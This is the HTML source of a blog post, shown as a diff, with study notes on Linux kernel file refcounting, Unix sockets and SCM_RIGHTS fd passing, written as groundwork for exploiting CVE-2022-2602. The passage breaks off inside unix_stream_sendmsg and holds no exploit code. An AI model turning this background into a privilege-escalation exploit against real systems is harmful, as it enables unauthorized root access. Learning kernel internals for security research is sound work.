@@ -1,0 +1,1076 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Notes on refcounting and Unix Garbage Collector in the Linux Kernel</title>
+    <meta name="description" content="As a means of studying and getting to know more about the linux kernel, especially exploitation(LPE &amp; RCE), i tried to make notes and go as far as i can in …">
+    <meta name="keywords" content='Linux, Memory, Kernel'>
+
+    <meta property="og:url" content="https://mohandacherir.github.io/Qdiv7/posts/refcounting-linux-kernel/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Notes on refcounting and Unix Garbage Collector in the Linux Kernel">
+    <meta property="og:description" content="As a means of studying and getting to know more about the linux kernel, especially exploitation(LPE &amp; RCE), i tried to make notes and go as far as i can in …">
+    <meta property="og:image" content="https://mohandacherir.github.io/Qdiv7/images/0074.png">
+    <meta property="og:image:secure_url" content="https://mohandacherir.github.io/Qdiv7/images/0074.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Notes on refcounting and Unix Garbage Collector in the Linux Kernel">
+    <meta name="twitter:description" content="As a means of studying and getting to know more about the linux kernel, especially exploitation(LPE &amp; RCE), i tried to make notes and go as far as i can in …">
+    <meta property="twitter:domain" content="https://mohandacherir.github.io/Qdiv7/posts/refcounting-linux-kernel/">
+    <meta property="twitter:url" content="https://mohandacherir.github.io/Qdiv7/posts/refcounting-linux-kernel/">
+    <meta name="twitter:image" content="https://mohandacherir.github.io/Qdiv7/images/0074.png">
+
+    
+    <link rel="canonical" href="https://mohandacherir.github.io/Qdiv7/posts/refcounting-linux-kernel/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/Qdiv7/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/Qdiv7/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/Qdiv7/css/dark.min.css">
+
+    
+    <script src="/Qdiv7/js/bundle.min.d802ac8af929bbc3ab5644409ae296a7b841359132018cdcd4848e2e300fa8d8.js" integrity="sha256-2AKsivkpu8OrVkRAmuKWp7hBNZEyAYzc1ISOLjAPqNg="></script>
+
+    
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://mohandacherir.github.io/Qdiv7/">
+                <img src='images/0074.png' alt="avatar">
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://mohandacherir.github.io/Qdiv7/">Qdiv7</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://mohandacherir.github.io/Qdiv7/posts/" aria-label="" > Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://mohandacherir.github.io/Qdiv7/tags/" aria-label="" > Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/MohandAcherir" aria-label="github" ><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://mohandacherir.github.io/Qdiv7/posts/" > Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://mohandacherir.github.io/Qdiv7/tags/" > Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/MohandAcherir" ><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Notes on refcounting and Unix Garbage Collector in the Linux Kernel</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">December 23, 2025
+           
+          </p>
+	
+
+        <ul class="post-tags">
+          
+           
+             <li class="post-tag"><a href="https://mohandacherir.github.io/Qdiv7/tags/linux">Linux</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="https://mohandacherir.github.io/Qdiv7/tags/memory">Memory</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="https://mohandacherir.github.io/Qdiv7/tags/kernel">Kernel</a></li>
+           
+         
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>As a means of studying and getting to know more about the linux kernel, especially exploitation(LPE &amp; RCE), i tried to make notes and go as far as i can in reviewing the <strong>unix garbage</strong>, or <strong>GC</strong>, collector, the <strong>io_uring</strong> subsystem, and some CVEs that showcase all of these. I am currently working on an N-day LPE for CVE-2022-2602 LPE to make it work with <strong>FUSE</strong> technique.</p>
+<p>To kick off this article, i will explain the basics of <strong>file structures</strong>, <strong>sockets</strong>&hellip;etc in the kernel, and then move onto to the unix GC and io_uring, and i&rsquo;ll wrap with the CVEs.</p>
+<p>I recommend supplementing with these readings to get a complementary understading:</p>
+<ul>
+<li><a href="https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html">https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html</a></li>
+<li><a href="https://lwn.net/Articles/779472/">https://lwn.net/Articles/779472/</a></li>
+<li><a href="https://blogs.oracle.com/linux/unix-garbage-collection-and-iouring">https://blogs.oracle.com/linux/unix-garbage-collection-and-iouring</a></li>
+</ul>
+<h3 id="file-structures-and-reference-counting">File structures and reference counting</h3>
+<p>The Linux kernel uses the <code>file</code> structure to represent files in the kernel, and since in Linux everything is a file, hence, everything has an associated <code>struct file</code>, be it a file, a socket, or io_uring rings&hellip;etc; and note that a file descriptor is an <strong>index</strong> into an array table in <code>struct files_struct</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> files_struct {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   * read mostly part
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">atomic_t</span> count;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> resize_in_progress;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">wait_queue_head_t</span> resize_wait;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> fdtable __rcu <span style="color:#f92672">*</span>fdt;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> fdtable fdtab;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   * written part on a separate cache line in SMP
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">spinlock_t</span> file_lock ____cacheline_aligned_in_smp;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> next_fd;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> close_on_exec_init[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> open_fds_init[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> full_fds_bits_init[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> file __rcu <span style="color:#f92672">*</span> fd_array[NR_OPEN_DEFAULT]; <span style="color:#f92672">&lt;------------------</span> array of to <span style="color:#66d9ef">struct</span> files, the returned <span style="color:#960050;background-color:#1e0010">`</span><span style="color:#66d9ef">int</span> fd<span style="color:#960050;background-color:#1e0010">`</span> is used to retieve its corresponding right <span style="color:#66d9ef">struct</span> file. 
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Like many kernel data structures, file structures can have multiple references to them outstanding at any given time. As a simple example, passing a file descriptor to <code>dup()</code> will allocate a second file descriptor referring to the same file structure; The kernel must keep track of these references to be able to know when any given file structure is no longer used and can be freed; that is done using the <strong>f_count</strong> field:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> file {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations	<span style="color:#f92672">*</span>f_op;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">enum</span> rw_hint		f_write_hint;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">atomic_long_t</span>		f_count; <span style="color:#f92672">&lt;-------------------</span> REF COUNTER
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> 		f_flags;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">fmode_t</span>			f_mode;		 <span style="color:#75715e">// RWX: permissions on the file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> mutex		f_pos_lock;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">loff_t</span>			f_pos;		 <span style="color:#75715e">// Current position
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> fown_struct	f_owner; <span style="color:#75715e">// owner
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred	<span style="color:#f92672">*</span>f_cred;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// [...]
+</span></span></span></code></pre></div><p>Whenever a reference is created, by calling <code>dup2()</code>, forking the process, starting an I/O operation, or any of a number of other ways, <strong>f_count</strong> must be increased. When a reference is removed, via a call to <code>close()</code> or <code>exit()</code>, for example, 	<code>f_count</code> is decreased; when it reaches zero, the structure can be freed: \</p>
+<p>Here&rsquo;s the kernel handler function for <code>dup2()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">do_dup2</span>(<span style="color:#66d9ef">struct</span> files_struct <span style="color:#f92672">*</span>files,
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">unsigned</span> fd, <span style="color:#66d9ef">unsigned</span> flags)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__releases</span>(<span style="color:#f92672">&amp;</span>files<span style="color:#f92672">-&gt;</span>file_lock)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>tofree;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> fdtable <span style="color:#f92672">*</span>fdt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	fdt <span style="color:#f92672">=</span> <span style="color:#a6e22e">files_fdtable</span>(files); <span style="color:#75715e">// get the fdtable
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	tofree <span style="color:#f92672">=</span> fdt<span style="color:#f92672">-&gt;</span>fd[fd];				<span style="color:#75715e">// make a place to the new fd
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>tofree <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">fd_is_open</span>(fd, fdt))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> Ebusy;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">get_file</span>(file);             [<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;--------</span> f_count increment
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ....
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (tofree)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">filp_close</span>(tofree, files); [<span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;----------</span> decrement<span style="color:#960050;background-color:#1e0010">&#39;</span>s the f_count of the replaced fd<span style="color:#960050;background-color:#1e0010">&#39;</span>s file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> fd;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ebusy:
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">spin_unlock</span>(<span style="color:#f92672">&amp;</span>files<span style="color:#f92672">-&gt;</span>file_lock);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EBUSY;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So, this example illustrates what i just said: <strong>[1]</strong> function <code>get_file</code> down the line basically increments file&rsquo;s f_count with <code>atomic_long_inc(&amp;f-&gt;f_count);</code>(the Linux Kernel developers like to complicate things, for a good reason i guess :). This is because a new reference to the file is added, which makes <code>f_count = 2</code>. <br>
+At <strong>[2]</strong>, the opposite happens; since the replaced fd is longer held in that index, a reference is dropped .i.e: it&rsquo;s backing file&rsquo;s f_count is decremented using <code>filp_close</code> -&gt; <code>fputs</code>.</p>
+<p>Now, let&rsquo;s look more towards the sockets side.</p>
+<h2 id="unix-sockets-and-sending-file-descriptors">Unix Sockets and Sending file descriptors:</h2>
+<p>As mentionned before, sockets aren&rsquo;t an exception to rule, in that they have a backing file structure in the kernel, so truly, &ldquo;In Linux, everything is a file&rdquo;. <br>
+In terms of kernel objects, there are 3 structures of sockets: \</p>
+<ul>
+<li><strong>BSD Socket</strong>: This is created with the syscall <code>socket(...)</code> and is represented with:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> socket {
+</span></span><span style="display:flex;"><span>	socket_state		state; <span style="color:#75715e">// socket state (%SS_CONNECTED, etc)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">short</span>			type;				 <span style="color:#75715e">// socket type (%SOCK_STREAM, etc)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>		flags; <span style="color:#75715e">// socket flags (%SOCK_NOSPACE, etc)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> file		<span style="color:#f92672">*</span>file; <span style="color:#75715e">// Backing file for Garbage Collector
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> sock		<span style="color:#f92672">*</span>sk;   <span style="color:#75715e">// internal networking protocol agnostic socket representation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> proto_ops	<span style="color:#f92672">*</span>ops; <span style="color:#75715e">// operation handlers : bind, connect, accept etc...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> socket_wq	wq;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>We can see the <code>struct file</code> which is for Garbage Collector usage(more on that later), and <code>struct sock</code>.</p>
+<ul>
+<li><strong><code>struct sock</code></strong> : network layer representation of sockets, and it&rsquo;s protocol-agnostic socket state used by all protocols: tcp, udp..etc. and it handles all the operations in the network layer level.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sock {
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">#define sk_refcnt		__sk_common.skc_refcnt </span><span style="color:#75715e">// sock&#39;s reference count
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> sk_buff_head sk_receive_queue;   <span style="color:#75715e">// Incoming packets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> sk_buff_head sk_write_queue;     <span style="color:#75715e">// Outgoing packets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> sk_buff_head sk_error_queue;     <span style="color:#75715e">// Error packets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Buffers &amp; limits
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span>                 sk_rcvbuf;           <span style="color:#75715e">// Receive buffer size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span>                 sk_sndbuf;           <span style="color:#75715e">// Send buffer size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Socket identity
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">#define sk_family		__sk_common.skc_family           </span><span style="color:#75715e">// AF_INET, AF_UNIX, etc.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    __u16               sk_protocol;         <span style="color:#75715e">// IPPROTO_TCP, etc.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Callbacks
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>sk_data_ready)(<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>sk);  <span style="color:#75715e">//  callback to indicate there is data to be processed
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>sk_write_space)(<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>sk); <span style="color:#75715e">// callback to indicate there is buffer sending space available
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>sk_error_report)(<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>sk);<span style="color:#75715e">// callback to indicate errors (e.g. %MSG_ERRQUEUE)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>sk_destruct)(<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>sk);    <span style="color:#75715e">// called at sock freeing time, i.e. when all refcnt == 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Backpointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> socket      <span style="color:#f92672">*</span>sk_socket;           <span style="color:#75715e">// reference its associated to BSD socket
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Credentials &amp; security
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred  <span style="color:#f92672">*</span>sk_peer_cred;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>So this structure handles packet sending and receiving, buffering and of course, refcounting to say the least. <br>
+Other strucuture inherit from <code>struct sock</code> to be specilized for a certain protocol: <code>inet_sock</code>, <code>tcp_sock</code> and <code>unix_sock</code>.</p>
+<p>The latter, <strong><code>unix_sock</code></strong> is of interest in the LPE universe, which is used for Unix Domain Sockets:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* The AF_UNIX socket */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> unix_sock {
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* WARNING: sk has to be the first member */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sock		sk;							 <span style="color:#75715e">// Inheritence
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> unix_address	<span style="color:#f92672">*</span>addr;		 <span style="color:#75715e">// Name of the socket
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> path		path;						 <span style="color:#75715e">// path in the filesystem if bound
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> mutex		iolock, bindlock; <span style="color:#75715e">// peer socket connected to 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> sock		<span style="color:#f92672">*</span>peer;				   <span style="color:#75715e">// peer socket connected to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> list_head	link;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">atomic_long_t</span>		inflight;			 <span style="color:#75715e">// [3] SCM_RIGHTS fd count
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> sk_buff		<span style="color:#f92672">*</span>oob_skb;		<span style="color:#75715e">// socket&#39;s buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>Everything is self explanatory, yet we need to focus more <strong>[3]</strong>: <strong>inflight</strong>. <br>
+But first, let&rsquo;s talk a &rsquo;lil bit about sending file descriptots over sockets. First, let&rsquo;s quickly address the why ? <br>
+The core need for this is simply <strong>ipc</strong>: sharing a resource from a priviliged process to an unprivileged one, communication between parent and child&hellip;etc. This <a href="https://gist.github.com/domfarolino/4293951bd95082125f2b9931cab1de40">article</a> gives good examples.</p>
+<p>So, fds can be passed from one socket to another using the <code>sendmsg</code> system call using <code>SCM_RIGHTS</code> message type like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// @s : The sending socket
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// @fd: socket to be sent
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">scmrights_send_fd</span>(<span style="color:#66d9ef">int</span> s, <span style="color:#66d9ef">int</span> fd) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> msghdr msg;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cmsghdr <span style="color:#f92672">*</span>cmsg;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">1024</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fds[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> { fd };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buffer, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buffer));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    msg.msg_control <span style="color:#f92672">=</span> buffer; 
+</span></span><span style="display:flex;"><span>    msg.msg_controllen <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(buffer);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    cmsg <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_FIRSTHDR</span>(<span style="color:#f92672">&amp;</span>msg); 
+</span></span><span style="display:flex;"><span>    cmsg<span style="color:#f92672">-&gt;</span>cmsg_level <span style="color:#f92672">=</span> SOL_SOCKET;
+</span></span><span style="display:flex;"><span>    cmsg<span style="color:#f92672">-&gt;</span>cmsg_type <span style="color:#f92672">=</span> SCM_RIGHTS;
+</span></span><span style="display:flex;"><span>    cmsg<span style="color:#f92672">-&gt;</span>cmsg_len <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_LEN</span>(<span style="color:#66d9ef">sizeof</span>(fds));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#a6e22e">CMSG_DATA</span>(cmsg), fds, <span style="color:#66d9ef">sizeof</span>(fds));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    msg.msg_controllen <span style="color:#f92672">=</span> <span style="color:#a6e22e">CMSG_SPACE</span>(<span style="color:#66d9ef">sizeof</span>(fds));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendmsg</span>(s, <span style="color:#f92672">&amp;</span>msg, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Let&rsquo;s take a dive into the <code>sendmsg</code> syscall for type <code>SOCK_STREAM</code> &amp; cmsg type <code>SCM_RIGHTS</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">unix_stream_sendmsg</span>(<span style="color:#66d9ef">struct</span> socket <span style="color:#f92672">*</span>sock, <span style="color:#66d9ef">struct</span> msghdr <span style="color:#f92672">*</span>msg,
+</span></span><span style="display:flex;"><span>			       <span style="color:#66d9ef">size_t</span> len)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>sk <span style="color:#f92672">=</span> sock<span style="color:#f92672">-&gt;</span>sk;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>other <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> err, size;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> sent <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> scm_cookie scm;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> fds_sent <span style="color:#f92672">=</span> false;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> data_len;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wait_for_unix_gc</span>();
